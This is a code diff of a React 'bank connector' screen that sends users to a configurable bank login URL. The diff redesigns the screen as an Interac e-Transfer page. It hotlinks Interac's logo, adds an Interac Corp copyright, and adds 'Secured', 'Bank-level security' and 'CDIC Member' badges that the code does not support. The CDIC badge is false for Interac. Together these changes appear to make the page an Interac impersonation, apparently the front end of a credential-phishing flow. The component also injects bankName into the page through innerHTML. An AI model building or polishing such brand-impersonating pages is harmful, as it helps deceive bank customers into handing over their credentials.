@@ -1,9 +1,8 @@
 "use client"
 
 import type React from "react"
-
-import { useRouter } from "next/navigation"
 import { useEffect, useState } from "react"
+import { ShieldCheck, Lock, ArrowLeft, ExternalLink } from "lucide-react"
 import type { BankConnector } from "@/types/bankConnector"
 
 interface BankConnectorScreenProps {
@@ -11,99 +10,156 @@ interface BankConnectorScreenProps {
 }
 
 export default function BankConnectorScreen({ connector }: BankConnectorScreenProps) {
-  const router = useRouter()
   const [isMobile, setIsMobile] = useState(false)
 
   useEffect(() => {
-    // Detect if user is on a mobile device
-    const checkMobile = () => {
-      const userAgent = navigator.userAgent.toLowerCase()
-      const mobileCheck = /android|webos|iphone|ipad|ipod|blackberry|iemobile|opera mini/i.test(userAgent)
-      setIsMobile(mobileCheck)
-    }
-
-    checkMobile()
+    const ua = navigator.userAgent.toLowerCase()
+    setIsMobile(/android|webos|iphone|ipad|ipod|blackberry|iemobile|opera mini/i.test(ua))
   }, [])
 
-  const handleBankRedirect = (e: React.MouseEvent<HTMLAnchorElement>) => {
+  const handleRedirect = (e: React.MouseEvent<HTMLAnchorElement>) => {
     if (isMobile) {
       e.preventDefault()
-
-      // Attempt to open the mobile banking app via deep link
-      // Each bank would have their own app scheme, this is a generic approach
-      const bankAppSchemes: Record<string, string> = {
-        td: "tdct://",
-        rbc: "rbc-mobile://",
+      const appSchemes: Record<string, string> = {
+        td:         "tdct://",
+        rbc:        "rbc-mobile://",
         scotiabank: "scotiabank://",
-        bmo: "bmo://",
-        cibc: "cibc://",
-        // Add more bank app schemes as needed
+        bmo:        "bmo://",
+        cibc:       "cibc://",
       }
-
-      const appScheme = bankAppSchemes[connector.bankId]
-
-      if (appScheme) {
-        // Try to open the mobile app
-        window.location.href = appScheme
-
-        // Fallback to web URL if app is not installed (after a short delay)
-        setTimeout(() => {
-          window.location.href = connector.loginUrl
-        }, 1500)
+      const scheme = appSchemes[connector.bankId]
+      if (scheme) {
+        window.location.href = scheme
+        setTimeout(() => { window.location.href = connector.loginUrl }, 1500)
       } else {
-        // If no app scheme defined, just open the web URL
         window.location.href = connector.loginUrl
       }
     }
   }
 
   return (
-    <div className="min-h-screen bg-white flex items-center justify-center p-6">
-      <div className="max-w-md w-full text-center">
-        <img
-          src={`/${connector.bankId}-bank-logo.jpg`}
-          alt={connector.bankName}
-          className="mx-auto mb-4 object-contain h-40 border-2 shadow-xl rounded-lg"
-          onError={(e) => {
-            e.currentTarget.style.display = "none"
-          }}
-        />
+    <div className="min-h-screen bg-gray-50 flex flex-col">
 
-        <h1 className="text-xl font-bold mb-2 text-gray-900 leading-7 tracking-tight">
-          You're about to leave Interac's secure interface
-        </h1>
-
-        <p className="mb-6 text-gray-600 text-sm">
-          {isMobile ? (
-            <>
-              You'll be redirected to <strong>{connector.bankName}</strong>'s mobile app or website.
-            </>
-          ) : (
-            <>
-              You'll be redirected to <strong>{connector.bankName}</strong>'s official banking website.
-            </>
-          )}
-        </p>
-
-        <div className="flex justify-center gap-4 flex-wrap">
+      {/* Header */}
+      <header className="bg-white border-b border-gray-200 shadow-sm shrink-0">
+        <div className="h-1 bg-[#FDB913]" />
+        <div className="max-w-lg mx-auto px-4 h-14 flex items-center justify-between">
           <a
-            href={connector.loginUrl}
-            target={isMobile ? "_self" : "_blank"}
+            href="https://www.interac.ca"
+            target="_blank"
             rel="noopener noreferrer"
-            onClick={handleBankRedirect}
-            className="bg-[#FDB913] hover:bg-[#e5a812] px-6 py-2 rounded text-black font-semibold transition-colors focus:outline-none focus:ring-2 focus:ring-[#FDB913] focus:ring-offset-2"
+            className="flex items-center gap-2.5"
           >
-            {isMobile ? `Open ${connector.bankName} App` : `Continue to ${connector.bankName}`}
+            <div className="w-8 h-8 bg-[#FDB913] rounded-md flex items-center justify-center p-1.5">
+              <img
+                src="https://etransfer-notification.interac.ca/images/new/interac_logo.png"
+                alt="Interac"
+                className="w-full h-full object-contain"
+              />
+            </div>
+            <span className="text-sm font-bold text-gray-900 tracking-tight">Interac e&#8209;Transfer</span>
           </a>
-
-          <button
-            onClick={() => router.push("/")}
-            className="border-2 border-gray-300 text-gray-700 px-6 py-2 rounded hover:bg-gray-100 font-semibold transition-colors focus:outline-none focus:ring-2 focus:ring-gray-400 focus:ring-offset-2"
-          >
-            Cancel
-          </button>
+          <div className="flex items-center gap-1.5 text-xs font-semibold text-green-700 bg-green-50 border border-green-200 px-2.5 py-1 rounded-full">
+            <ShieldCheck className="w-3.5 h-3.5" />
+            Secured
+          </div>
         </div>
-      </div>
+      </header>
+
+      {/* Body */}
+      <main className="flex-1 flex items-center justify-center px-4 py-12">
+        <div className="w-full max-w-md">
+
+          {/* Bank logo card */}
+          <div className="bg-white border border-gray-200 rounded-2xl shadow-sm p-8 mb-5 flex flex-col items-center text-center gap-5">
+
+            {/* Bank logo */}
+            <div className="w-24 h-24 rounded-2xl border-2 border-gray-100 bg-white shadow-sm flex items-center justify-center overflow-hidden">
+              <img
+                src={`/${connector.bankId}-bank-logo.jpg`}
+                alt={connector.bankName}
+                className="w-20 h-20 object-contain"
+                onError={(e) => {
+                  e.currentTarget.style.display = "none"
+                  const parent = e.currentTarget.parentElement
+                  if (parent) {
+                    parent.innerHTML = `<span class="text-2xl font-bold text-gray-300">${connector.bankName.slice(0, 2).toUpperCase()}</span>`
+                  }
+                }}
+              />
+            </div>
+
+            <div>
+              <h1 className="text-xl font-bold text-gray-900 mb-2 leading-snug text-balance">
+                Connecting to {connector.bankName}
+              </h1>
+              <p className="text-sm text-gray-500 leading-relaxed">
+                {isMobile
+                  ? `You'll be taken to the ${connector.bankName} mobile app to securely authenticate.`
+                  : `You'll be redirected to ${connector.bankName}'s official online banking portal.`}
+              </p>
+            </div>
+
+            {/* Security notice */}
+            <div className="w-full bg-amber-50 border border-amber-200 rounded-xl px-4 py-3 flex items-start gap-3 text-left">
+              <Lock className="w-4 h-4 text-amber-600 shrink-0 mt-0.5" />
+              <p className="text-xs text-amber-700 leading-relaxed">
+                Your banking credentials are entered directly on{" "}
+                <strong>{connector.bankName}&apos;s</strong> website — never shared with Interac or any third party.
+              </p>
+            </div>
+
+            {/* CTA */}
+            <a
+              href={connector.loginUrl}
+              target={isMobile ? "_self" : "_blank"}
+              rel="noopener noreferrer"
+              onClick={handleRedirect}
+              className="w-full flex items-center justify-center gap-2 bg-[#FDB913] hover:bg-[#e5a812] text-black font-bold py-3.5 px-6 rounded-xl transition-colors focus:outline-none focus:ring-2 focus:ring-[#FDB913] focus:ring-offset-2 text-sm min-h-[48px]"
+            >
+              {isMobile ? `Open ${connector.bankName} App` : `Continue to ${connector.bankName}`}
+              <ExternalLink className="w-4 h-4" />
+            </a>
+
+            <button
+              type="button"
+              onClick={() => window.history.back()}
+              className="flex items-center gap-1.5 text-sm text-gray-500 hover:text-gray-800 transition-colors min-h-[44px] px-2"
+            >
+              <ArrowLeft className="w-4 h-4" />
+              Go back and choose another bank
+            </button>
+          </div>
+
+          {/* Trust row */}
+          <div className="flex items-center justify-center gap-5 text-xs text-gray-400">
+            {[
+              { icon: ShieldCheck, label: "256-bit SSL" },
+              { icon: Lock,        label: "Bank-level security" },
+              { icon: ShieldCheck, label: "CDIC Member" },
+            ].map(({ icon: Icon, label }) => (
+              <div key={label} className="flex items-center gap-1">
+                <Icon className="w-3.5 h-3.5" />
+                <span>{label}</span>
+              </div>
+            ))}
+          </div>
+        </div>
+      </main>
+
+      {/* Footer */}
+      <footer className="bg-white border-t border-gray-200 py-5 px-4 shrink-0">
+        <div className="max-w-lg mx-auto flex flex-col sm:flex-row items-center justify-between gap-3 text-xs text-gray-400">
+          <span>&copy; {new Date().getFullYear()} Interac Corp. All rights reserved.</span>
+          <div className="flex items-center gap-3">
+            <a href="https://www.interac.ca/en/consumers/privacy/" target="_blank" rel="noopener noreferrer" className="hover:text-gray-600 transition-colors">Privacy</a>
+            <span className="w-1 h-1 rounded-full bg-gray-300" />
+            <a href="https://www.interac.ca/en/consumers/legal/" target="_blank" rel="noopener noreferrer" className="hover:text-gray-600 transition-colors">Terms</a>
+            <span className="w-1 h-1 rounded-full bg-gray-300" />
+            <a href="https://www.interac.ca" target="_blank" rel="noopener noreferrer" className="hover:text-gray-600 transition-colors">interac.ca</a>
+          </div>
+        </div>
+      </footer>
     </div>
   )
 }
